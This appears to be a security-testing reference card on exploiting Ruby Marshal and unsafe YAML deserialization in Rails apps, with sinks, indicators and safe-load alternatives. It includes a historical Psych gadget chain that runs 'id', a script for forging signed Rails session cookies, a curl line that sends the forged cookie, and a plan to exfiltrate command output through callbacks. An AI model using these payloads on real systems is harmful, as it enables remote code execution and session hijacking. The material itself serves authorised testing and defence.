# Ruby Marshal Deserialization

## Purpose

Test Ruby / Rails applications that pass attacker-controlled data to `Marshal.load()` or `YAML.load()` with Psych unsafe tags, enabling code execution through gadget chains in Rails, Devise, ActiveRecord, and related libraries.

## Applicability

- Ruby on Rails application
- Session cookie contains opaque binary or base64 blob (not a signed JWT)
- Application uses `Marshal.load` for caching, job queuing, or session storage
- Rack-based app with custom session serializer set to `:marshal`
- Endpoints processing Ruby-serialized data from external sources (Redis, Memcache, file)

## Preconditions

- User-controlled bytes reach `Marshal.load()` without HMAC verification, OR HMAC secret is known/bypassable
- Rails < 4.1 used `Marshal` as the default session serializer (older apps)
- Target classpath (Gemfile.lock) contains gadget classes (Rails, ActiveSupport, Rack, etc.)
- For YAML path: `YAML.load` without `permitted_classes` argument on Ruby >= 3.1, or `YAML.unsafe_load`

## Relevant Architecture

**Direct Marshal path**
```
User input (cookie / POST body / cache)
    → Base64.decode64(data)
    → Marshal.load(bytes)          ← sink
    → object graph reconstruction
    → _load / initialize_copy / to_s / etc. lifecycle hooks
    → gadget chain → eval / system / exec / Kernel.open
```

**Rails session path (legacy)**
```
Signed cookie (Rails 3.x / early 4.x CookieStore with Marshal serializer)
    → signature verification (HMAC-SHA1 using SECRET_KEY_BASE)
        ├─ key unknown → blocked
        └─ key known → forge cookie → Marshal.load → RCE
    → Marshal.load(decoded_session)
```

**Redis / Sidekiq job path (second-order)**
```
Job enqueued with marshaled arguments
    → Redis stores Marshal blob
    → Worker dequeues → Marshal.load(job_args)  ← sink
    → if args influenced by user → RCE
```

## Technical Knowledge

**Marshal format magic bytes**
- Ruby Marshal 4.8: `\x04\x08` (version 4, sub-version 8)
- Base64 of `\x04\x08`: starts with `BAg` or `BAgI` depending on payload

**Marshal.load lifecycle hooks** (not full list — depends on class)
```ruby
Marshal.load calls:
  obj._load(string)          # if class defines _load (self)
  obj.marshal_load(array)    # if marshal_load defined
  # After reconstruction: no automatic __destruct; hooks are class-method defined
```

**Gadget chain approach in Rails**
Rails gadget chains typically abuse:
- `Gem::SpecFetcher` → triggers `Kernel.open` via source fetching
- `ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy` → method_missing chain
- `ERB` / `ActionView::Template` → template rendering → code execution
- `Rack::Utils::HeaderHash` → via string coercion

**YAML unsafe load (Ruby)**
```ruby
# Vulnerable (Ruby < 3.1 default, or explicit unsafe)
YAML.load(user_input)
YAML.unsafe_load(user_input)

# Safe (Ruby 3.1+ default for YAML.load; explicit for older)
YAML.safe_load(user_input)
YAML.load(user_input, permitted_classes: [])
```

**YAML exploit tags (Ruby Psych)**
```yaml
--- !ruby/object:Gem::Installer
  i: !ruby/object:Gem::SpecFetcher
    i: !ruby/object:Gem::Requirement
      requirements: !ruby/object:Gem::Package::TarReader
        io: !ruby/object:Net::BufferedIO
          io: !ruby/object:Gem::Package::TarReader::Entry
            read_limit: 0
            header: !ruby/object:Gem::Package::TarHeader
              length: 0 name: "| id"
```
(Historical chain; actual chains depend on installed gem versions — use tools for current chains.)

**SECRET_KEY_BASE discovery**
- Leaked from `config/secrets.yml`, `config/credentials.yml.enc` (if master.key disclosed), `.env`, Heroku config vars visible in error pages
- Default test/development keys in known open-source apps

**Forging Rails 3/4 signed session cookie**
```ruby
require 'openssl'
require 'base64'
require 'json'

secret = '<SECRET_KEY_BASE>'
payload = Marshal.dump(your_gadget_object)
session_b64 = Base64.strict_encode64(payload)
digest = OpenSSL::HMAC.hexdigest('SHA1', secret, session_b64)
cookie_value = "#{session_b64}--#{digest}"
```

## Indicators

**Black-box**
- Cookie value decodes (base64) to bytes starting with `\x04\x08`
- Rails 3.x / 4.0 application (check `X-Powered-By`, error pages, `config.ru` patterns)
- Rack session with custom serializer visible in error or source
- `TypeError (incompatible marshal file format)` when cookie is tampered

**White-box**
```ruby
Marshal.load(data)
Marshal.load(Base64.decode64(cookie))
YAML.load(user_input)           # pre-3.1 or explicit unsafe
YAML.unsafe_load(user_input)
# Rails session config:
Rails.application.config.session_store :cookie_store,
  key: '_app_session',
  serializer: :marshal   # legacy; default is :json in Rails 4.1+
```

## Interpretation

1. **`TypeError: incompatible marshal file format`** on tampered cookie → `Marshal.load` sink confirmed; format validation active
2. **`NameError: uninitialized constant SomeClass`** → `Marshal.load` reached but class not autoloaded yet; trigger autoload or use a loaded class
3. **`ArgumentError: undefined class/module`** → class not available in Marshal's context; choose gadget from preloaded gems
4. **OOB DNS/HTTP callback** → gadget chain execution confirmed
5. **Session becomes valid with forged cookie** → SECRET_KEY_BASE guessed/obtained; forge Marshal session

## Security-Relevant Conditions

- **Rails 3.x with CookieStore + Marshal**: If SECRET_KEY_BASE is obtained, full session forgery + RCE
- **Rails 4.1+**: Default serializer changed to JSON — check if app explicitly uses `:marshal`
- **Redis cache storing Marshal.dump output**: If cache key is partially user-controlled, second-order injection
- **Sidekiq with `Marshal` job serializer (non-default)**: Job arguments deserializable if Redis is accessible
- **YAML.load in Ruby ≥ 3.1**: Now raises `DisallowedClass` by default for non-permitted types — YAML path less reliable on modern Ruby

## Experiment Considerations

- Obtain SECRET_KEY_BASE before testing Marshal session injection — without it, session is HMAC-protected
- Use a minimal gadget that triggers a DNS callback as first oracle — exec chains more complex in Ruby
- Ruby garbage collection and `finalize`/hook timing may differ from Python/Java — test execution timing
- YAML chain applicability depends heavily on installed gem versions; check `Gemfile.lock`
- For Redis-stored Marshal data: need Redis access or ability to inject into a cache key

## Evidence Expectations

1. Forged cookie (with known SECRET_KEY_BASE) or direct Marshal injection sent
2. OOB DNS/HTTP callback received → gadget chain executed
3. Bounded command output (`id`, `hostname`) exfiltrated via HTTP callback
4. Document: cookie/parameter name, encoding, SECRET_KEY_BASE source (if used), gem versions, Rails version, gadget chain description

## Failure Interpretation

| Observation | Interpretation |
|-------------|---------------|
| `JSON::ParserError` on cookie | Rails is using JSON serializer, not Marshal |
| `ActiveSupport::MessageVerifier::InvalidSignature` | HMAC protected; need SECRET_KEY_BASE |
| `ArgumentError: undefined class/module X` | Gadget class not autoloaded; use a class autoloaded by the request |
| No OOB callback from Marshal gadget | Chain not triggered; verify gadget reconstruction path |
| `DisallowedClass (YAML::DisallowedClass)` | Ruby 3.1+ YAML.load safe mode; target uses permitted_classes list |

## False Positives

- Cookie is base64 but decodes to JSON (Rails 4.1+ default) — not Marshal
- `Marshal.load` present in source but receives data from trusted server-internal source only — verify user data flow
- HMAC signature present and SECRET_KEY_BASE is strong and not disclosed — protected unless key obtained

## Limitations

- Gadget chain availability changes with gem version; Gemfile.lock review is essential for white-box, and error-based class enumeration for black-box
- Ruby 3.1+ YAML.safe_load default reduces YAML attack surface significantly
- Rails 4.1+ JSON session serializer default reduces Marshal attack surface
- SECRET_KEY_BASE requirement for session-based injection is a significant barrier if key is not disclosed

## Related Knowledge

- `signed-state` — when the Marshal blob is signed with SECRET_KEY_BASE (standard Rails CookieStore)
- `second-order` — when Marshal data is stored in Redis/cache and loaded by a background worker
- `python-yaml` — analogous YAML unsafe load in Python
- CVE-2013-0156 (Rails YAML remote code execution) — historical high-profile Ruby deserialization
- CVE-2019-5420 (Rails file disclosure) — path toward SECRET_KEY_BASE leakage

## Tooling

```ruby
#!/usr/bin/env ruby
# forge_rails_session.rb
require 'openssl'
require 'base64'

def forge_session(secret, marshal_payload)
  encoded = Base64.strict_encode64(marshal_payload)
  digest = OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret, encoded)
  "#{encoded}--#{digest}"
end

# Minimal DNS oracle gadget (replace with actual gadget chain from tool)
# Example: trigger open() to attacker URL
gadget = ... # Build or obtain gadget object

cookie = forge_session(ENV['SECRET_KEY_BASE'], Marshal.dump(gadget))
puts "Set-Cookie: _session_id=#{cookie}"
```

```bash
# Send forged session cookie
curl -s -b "_session_id=<forged-cookie>" https://target/

# Check Marshal magic bytes in existing cookie
echo -n "<base64-cookie-value>" | base64 -d | xxd | head -1
# Look for: 04 08 at start
```